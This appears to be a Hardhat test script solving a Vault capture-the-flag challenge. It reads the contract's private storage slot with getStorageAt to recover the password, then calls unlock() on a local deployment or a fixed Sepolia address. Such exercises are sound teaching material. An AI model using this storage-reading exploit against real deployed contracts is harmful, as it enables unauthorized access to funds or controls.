import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { exit } from "process";
import { Vault, Vault__factory } from "../../typechain-types";
import { createWallet, tx2contract } from "../sdk";
const hre = require('hardhat');

describe("Hack", function () {
  this.timeout(6000000);

  let signers : SignerWithAddress[]
  let owner: SignerWithAddress;
  let hc : Vault

  before(async () => {
    signers = await ethers.getSigners()
    owner = signers[0];
    console.log("owner : ", owner.address)

  });

  it("Deploy HackContract", async function () {
		if (hre.hardhatArguments.network == undefined) {
      hc = await new Vault__factory(owner).deploy(ethers.utils.formatBytes32String('1234'))
      console.log("hc address : ", hc.address)
    } else {
      const  HC_CONTRACT_ADDR = "0x71384FfECCaAe5afffA5b3e38996B219046f15eD"
      hc = Vault__factory.connect(HC_CONTRACT_ADDR, owner)
    }
  });


  let PASSWORD : string | any
  it("get storage", async function () {
    // const slotIndex = ethers.utils.keccak256(
    //   ethers.utils.defaultAbiCoder.encode(
    //     [ "bytes32", "uint256"],
    //     [ ethers.utils.formatBytes32String((BigInt(hc.address) << BigInt(96)).toString()), 1]
    //   )
    // )

    // const slot = await hc.calculateSlot(hc.address, 1)
    
    PASSWORD = await owner.provider?.getStorageAt(hc.address, 1)
    console.log("PASSWORD : ", PASSWORD)
  });

  it("hack tx", async function () {
    let signer = owner

    async function tx() {
      
      const abi = [
        "function unlock(bytes32) external"
      ]
    
      const TX_VALUE = ethers.utils.parseEther("0")
      const TX_GAS_LIMIT = BigInt(1000000)
      const reciept = await tx2contract(
        hc.address,
        abi,
        "unlock",
        [PASSWORD],
        signer,
        TX_VALUE.toBigInt(),
        TX_GAS_LIMIT
      )
      console.log("reciept : ", reciept)
    }

    await tx()

		if (hre.hardhatArguments.network == undefined) {
      expect(await hc.locked()).eq(false)
    }
  });

});



// Test : yarn hardhat test test/security/*.ts --network sepolia